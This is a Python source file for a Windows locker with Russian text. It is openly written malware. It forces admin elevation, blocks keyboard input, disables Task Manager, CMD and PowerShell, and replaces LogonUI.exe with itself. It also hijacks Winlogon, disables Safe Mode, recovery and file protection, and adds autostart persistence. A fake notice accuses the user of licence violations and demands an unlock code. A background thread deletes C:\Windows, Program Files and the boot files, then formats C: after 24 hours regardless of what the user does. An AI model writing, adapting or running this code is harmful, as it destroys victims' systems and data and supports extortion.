import sys
import os

# 2. Windows 7 FIX (ДОБАВИТЬ)
if sys.platform == 'win32':
    try:
        system_root = os.environ.get('SystemRoot', 'C:\\Windows')
        sys_paths = [
            os.path.join(system_root, 'System32'),
            os.path.join(system_root, 'SysWOW64'),
            os.path.dirname(sys.executable)
        ]
        for path in sys_paths:
            if path not in sys.path:
                sys.path.append(path)
        import ctypes
        kernel32 = ctypes.windll.kernel32
    except:
        pass

# 3. Остальные импорты
import win32con
import win32gui
import win32api
import win32security
import subprocess
import time
import threading
import shutil
import platform
import socket
import stat
from ctypes import wintypes
from tkinter import *
from tkinter import ttk
import tkinter as tk

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    while not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()
        except:
            time.sleep(1)
            continue

request_admin()

def block_keys():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

def unblock_keys():
    try:
        ctypes.windll.user32.BlockInput(False)
    except:
        pass

def kill_explorer():
    """Убивает explorer.exe"""
    try:
        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(1)
        return True
    except:
        return False

def start_explorer():
    """Запускает explorer.exe"""
    try:
        subprocess.Popen(["explorer.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

def disable_task_manager():
    try:
        subprocess.run(
            ["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
             "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def enable_task_manager():
    try:
        subprocess.run(
            ["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
             "/v", "DisableTaskMgr", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def disable_cmd_powershell():
    try:
        subprocess.run(
            ["reg", "add", "HKCU\\Software\\Policies\\Microsoft\\Windows\\System",
             "/v", "DisableCMD", "/t", "REG_DWORD", "/d", "2", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["reg", "add", "HKCU\\Software\\Policies\\Microsoft\\PowerShell",
             "/v", "Enable", "/t", "REG_DWORD", "/d", "0", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def enable_cmd_powershell():
    try:
        subprocess.run(
            ["reg", "delete", "HKCU\\Software\\Policies\\Microsoft\\Windows\\System",
             "/v", "DisableCMD", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["reg", "delete", "HKCU\\Software\\Policies\\Microsoft\\PowerShell",
             "/v", "Enable", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def force_take_ownership(path):
    """Принудительное получение прав на файл"""
    try:
        subprocess.run(["net", "stop", "TrustedInstaller"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(2)
        
        os.system(f'attrib -r -s -h "{path}"')
        
        subprocess.run(["takeown", "/f", path], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["icacls", path, "/grant", "Administrator:F"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["icacls", path, "/grant", "SYSTEM:F"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

def hijack_logonui_enhanced():
    """Усиленная замена LogonUI с гарантией"""
    try:
        logonui_path = "C:\\Windows\\System32\\LogonUI.exe"
        backup_path = "C:\\Windows\\System32\\LogonUI_backup.exe"
        temp_path = "C:\\Windows\\Temp\\LogonUI_temp.exe"
        
        force_take_ownership(logonui_path)
        
        if os.path.exists(logonui_path):
            if not os.path.exists(backup_path):
                shutil.copy2(logonui_path, backup_path)
            
            shutil.copy2(sys.argv[0], temp_path)
            
            try:
                os.remove(logonui_path)
            except:
                pass
            os.rename(temp_path, logonui_path)
        
        os.system(f'attrib +r +s +h "{logonui_path}"')
        
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
             "/v", "Shell", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
             "/v", "Userinit", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
             "/v", "SFCDisable", "/t", "REG_DWORD", "/d", "1", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
             "/v", "SFCScan", "/t", "REG_DWORD", "/d", "0", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        print("[+] LogonUI успешно заменен с усиленной защитой")
        return True
        
    except Exception as e:
        print(f"[-] Ошибка замены LogonUI: {e}")
        return False

def restore_logonui():
    try:
        logonui_path = "C:\\Windows\\System32\\LogonUI.exe"
        backup_path = "C:\\Windows\\System32\\LogonUI_backup.exe"
        
        if os.path.exists(backup_path):
            try:
                os.remove(logonui_path)
                os.rename(backup_path, logonui_path)
            except:
                pass
    except:
        pass

def block_safe_mode_enhanced():
    """Усиленная блокировка всех вариантов безопасного режима"""
    try:
        subprocess.run(
            ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal",
             "/v", "WinLocker", "/t", "REG_SZ", "/d", "Service", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network",
             "/v", "WinLocker", "/t", "REG_SZ", "/d", "Service", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
             "/v", "AlternateShell", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System",
             "/v", "DisableBootDisplay", "/t", "REG_DWORD", "/d", "1", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["bcdedit", "/set", "{bootmgr}", "displaybootmenu", "no"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["bcdedit", "/set", "{globalsettings}", "advancedoptions", "false"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reagentc", "/disable"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinLocker",
             "/ve", "/t", "REG_SZ", "/d", "Service", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        print("[+] Safe Mode полностью заблокирован")
        return True
        
    except Exception as e:
        print(f"[-] Ошибка блокировки Safe Mode: {e}")
        return False

def restore_safe_mode():
    try:
        subprocess.run(
            ["reg", "delete", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal",
             "/v", "WinLocker", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["reg", "delete", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network",
             "/v", "WinLocker", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["reg", "delete", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
             "/v", "AlternateShell", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def add_autostart_enhanced():
    """Усиленная автозагрузка"""
    try:
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
             "/v", "WinLocker", "/t", "REG_SZ", "/d", sys.argv[0], "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
             "/v", "Shell", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
             "/v", "Userinit", "/t", "REG_SZ", "/d", sys.argv[0], "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["sc", "create", "WinLockerService", "binPath=", sys.argv[0], "start=", "auto"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        subprocess.run(
            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
             "/v", "Shell", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        print("[+] Автозагрузка усилена")
        return True
        
    except:
        return False

def remove_autostart():
    try:
        subprocess.run(
            ["reg", "delete", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
             "/v", "WinLocker", "/f"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            ["sc", "delete", "WinLockerService"],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def get_system_info():
    info = {}
    info['Computer Name'] = socket.gethostname()
    info['User Name'] = os.getlogin()
    info['OS'] = platform.system() + ' ' + platform.release()
    info['Version'] = platform.version()
    info['Architecture'] = platform.machine()
    info['Processor'] = platform.processor()
    try:
        info['Windows Directory'] = os.environ.get('WINDIR', 'Unknown')
    except:
        info['Windows Directory'] = 'Unknown'
    return info

def delete_windows():
    time.sleep(86400)
    try:
        subprocess.run(["takeown", "/f", "C:\\Windows", "/r", "/d", "y"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["icacls", "C:\\Windows", "/grant", "Administrator:F", "/t"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.run(["cmd", "/c", "rd /s /q C:\\Windows"], 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.run(["cmd", "/c", "rd /s /q C:\\Program Files"], 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["cmd", "/c", "rd /s /q C:\\Program Files (x86)"], 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.run(["cmd", "/c", "rd /s /q C:\\Boot"], 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.run(["cmd", "/c", "del /f /s /q /a C:\\bootmgr"], 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(["cmd", "/c", "del /f /s /q /a C:\\BOOTNXT"], 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.run(["cmd", "/c", "format C: /q /y"], 
                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.run(["shutdown", "/r", "/t", "0"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    sys.exit()

class WinLocker:
    def __init__(self):
        disable_task_manager()
        disable_cmd_powershell()
        block_safe_mode_enhanced()
        hijack_logonui_enhanced()
        add_autostart_enhanced()
        
        # Убиваем explorer.exe
        kill_explorer()
        
        block_keys()
        
        self.root = tk.Tk()
        self.root.title("Windows Locked")
        self.root.geometry("1100x700")
        self.root.configure(bg='#2a2a2a')
        self.root.attributes('-alpha', 0.88)
        self.root.attributes('-fullscreen', True)
        self.root.overrideredirect(True)
        self.root.lift()
        self.root.focus_force()
        self.root.attributes('-topmost', True)
        
        # ИСПРАВЛЕНА ОШИБКА "Windows" - заменено на "Super_L" и "Super_R"
        self.root.bind_all("<Control-Key>", lambda e: "break")
        self.root.bind_all("<Alt-Key>", lambda e: "break")
        self.root.bind_all("<Escape>", lambda e: "break")
        self.root.bind_all("<F1>", lambda e: "break")
        self.root.bind_all("<F4>", lambda e: "break")
        self.root.bind_all("<Super_L>", lambda e: "break")  # Левая клавиша Windows
        self.root.bind_all("<Super_R>", lambda e: "break")  # Правая клавиша Windows
        self.root.bind_all("<Key>", lambda e: "break")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.password = ""
        self.correct = "19499393"
        self.remaining = 86400
        self.timer_id = None
        
        self.build_ui()
        self.update_timer()
        self.root.mainloop()
    
    def build_ui(self):
        main_container = Frame(self.root, bg='#2a2a2a')
        main_container.pack(expand=True, fill=BOTH, padx=60, pady=60)
        
        left_frame = Frame(main_container, bg='#2a2a2a')
        left_frame.pack(side=LEFT, fill=BOTH, expand=True, padx=(0, 30))
        
        right_frame = Frame(main_container, bg='#2a2a2a', highlightbackground='#aaaaaa', highlightthickness=1)
        right_frame.pack(side=RIGHT, fill=Y, padx=(30, 0), pady=20)
        right_frame.config(width=300)
        right_frame.pack_propagate(False)
        
        title_label = Label(left_frame, text="Windows заблокирован!", 
                           font=('Segoe UI', 28, 'bold'), fg='#ffffff', bg='#2a2a2a')
        title_label.pack(anchor=W, pady=(0, 20))
        
        pass_frame = Frame(left_frame, bg='#2a2a2a', highlightbackground='#aaaaaa', highlightthickness=1)
        pass_frame.pack(fill=X, pady=(0, 15))
        
        self.pass_entry = Entry(pass_frame, font=('Segoe UI', 18), bg='#3a3a3a', 
                                fg='white', justify=CENTER, state='readonly',
                                readonlybackground='#3a3a3a', width=30)
        self.pass_entry.pack(pady=10, padx=10, fill=X)
        self.update_pass_display()
        
        btn_frame = Frame(left_frame, bg='#2a2a2a')
        btn_frame.pack(fill=X, pady=(0, 20))
        
        for i in range(10):
            btn = Button(btn_frame, text=str(i), font=('Segoe UI', 14, 'bold'),
                        bg='#3a3a3a', fg='#ffffff', width=5, height=1,
                        highlightbackground='#aaaaaa', highlightthickness=1,
                        relief=FLAT, bd=0,
                        command=lambda t=str(i): self.on_keypress(t))
            btn.pack(side=LEFT, padx=3)
        
        clear_btn = Button(btn_frame, text="Очистить", font=('Segoe UI', 12, 'bold'),
                          bg='#3a3a3a', fg='#ff6666', width=8, height=1,
                          highlightbackground='#aaaaaa', highlightthickness=1,
                          relief=FLAT, bd=0,
                          command=self.clear_password)
        clear_btn.pack(side=LEFT, padx=3)
        
        ok_btn = Button(btn_frame, text="OK", font=('Segoe UI', 14, 'bold'),
                       bg='#3a3a3a', fg='#66ff66', width=6, height=1,
                       highlightbackground='#aaaaaa', highlightthickness=1,
                       relief=FLAT, bd=0,
                       command=self.check_password)
        ok_btn.pack(side=LEFT, padx=3)
        
        text_frame = Frame(left_frame, bg='#2a2a2a', highlightbackground='#aaaaaa', highlightthickness=1)
        text_frame.pack(fill=BOTH, expand=True, pady=(0, 15))
        
        message = """Ваша система Windows была заблокирована по следующим причинам:

- Обнаружено использование нелицензионного программного обеспечения
- Зафиксирована работа читов и взломщиков игр
- Нарушение лицензионного соглашения Microsoft (EULA)
- Несанкционированный доступ к системным файлам Windows
- Попытка обхода механизмов безопасности

Для разблокировки системы введите код доступа."""
        
        msg_label = Label(text_frame, text=message, font=('Segoe UI', 11), 
                         fg='#cccccc', bg='#2a2a2a', justify=LEFT)
        msg_label.pack(pady=15, padx=15, anchor=W)
        
        timer_label = Label(left_frame, text="Таймер:", 
                           font=('Segoe UI', 12, 'bold'), fg='#ffffff', bg='#2a2a2a')
        timer_label.pack(anchor=W, pady=(0, 5))
        
        timer_frame = Frame(left_frame, bg='#2a2a2a', highlightbackground='#aaaaaa', highlightthickness=1)
        timer_frame.pack(fill=X, pady=(0, 10))
        
        self.timer_display = Label(timer_frame, text="24:00:00", font=('Segoe UI', 22, 'bold'),
                                   fg='#ff6666', bg='#2a2a2a')
        self.timer_display.pack(pady=8)
        
        warning_label = Label(left_frame, text="Внимание! После окончания таймера система будет необратимо уничтожена!",
                             font=('Segoe UI', 11, 'bold'), fg='#ff4444', bg='#2a2a2a')
        warning_label.pack(anchor=W, pady=(5, 0))
        
        info_title = Label(right_frame, text="СИСТЕМНАЯ ИНФОРМАЦИЯ", 
                          font=('Segoe UI', 12, 'bold'), fg='#ffffff', bg='#2a2a2a')
        info_title.pack(pady=(20, 15))
        
        sys_info = get_system_info()
        
        info_frame = Frame(right_frame, bg='#2a2a2a')
        info_frame.pack(fill=BOTH, expand=True, padx=15, pady=5)
        
        row = 0
        for key, value in sys_info.items():
            key_label = Label(info_frame, text=key + ":", font=('Segoe UI', 10, 'bold'),
                             fg='#aaaaaa', bg='#2a2a2a', anchor=W)
            key_label.grid(row=row, column=0, sticky=W, pady=4)
            
            val_label = Label(info_frame, text=value, font=('Segoe UI', 10),
                             fg='#ffffff', bg='#2a2a2a', anchor=W)
            val_label.grid(row=row, column=1, sticky=W, pady=4, padx=(10, 0))
            row += 1
        
        sep = Frame(right_frame, bg='#aaaaaa', height=1)
        sep.pack(fill=X, padx=15, pady=10)
        
        extra_label = Label(right_frame, text="Серийный номер лицензии:", 
                           font=('Segoe UI', 10, 'bold'), fg='#aaaaaa', bg='#2a2a2a')
        extra_label.pack(pady=(5, 0))
        
        license_label = Label(right_frame, text="XXXXX-XXXXX-XXXXX-XXXXX", 
                             font=('Segoe UI', 10), fg='#ff6666', bg='#2a2a2a')
        license_label.pack(pady=(0, 10))
        
        status_label = Label(right_frame, text="СТАТУС: ЗАБЛОКИРОВАНА", 
                            font=('Segoe UI', 11, 'bold'), fg='#ff4444', bg='#2a2a2a')
        status_label.pack(pady=(10, 20))
    
    def on_keypress(self, char):
        if len(self.password) < 20:
            self.password += char
            self.update_pass_display()
    
    def update_pass_display(self):
        display = '•' * len(self.password)
        self.pass_entry.config(state='normal')
        self.pass_entry.delete(0, END)
        self.pass_entry.insert(0, display)
        self.pass_entry.config(state='readonly')
    
    def clear_password(self):
        self.password = ""
        self.update_pass_display()
        self.pass_entry.config(readonlybackground='#3a3a3a')
    
    def check_password(self):
        if self.password == self.correct:
            self.unlock_system()
        else:
            self.password = ""
            self.update_pass_display()
            self.pass_entry.config(readonlybackground='#4a0000')
            self.root.after(300, lambda: self.pass_entry.config(readonlybackground='#3a3a3a'))
    
    def unlock_system(self):
        unblock_keys()
        enable_task_manager()
        enable_cmd_powershell()
        restore_safe_mode()
        restore_logonui()
        remove_autostart()
        
        # Запускаем explorer.exe обратно
        start_explorer()
        
        self.root.destroy()
        
        subprocess.run(["shutdown", "/r", "/t", "2"], 
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit()
    
    def update_timer(self):
        if self.remaining <= 0:
            delete_windows()
            return
        
        hours = self.remaining // 3600
        minutes = (self.remaining % 3600) // 60
        seconds = self.remaining % 60
        self.timer_display.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        self.remaining -= 1
        self.timer_id = self.root.after(1000, self.update_timer)

if __name__ == "__main__":
    threading.Thread(target=delete_windows, daemon=True).start()
    app = WinLocker()
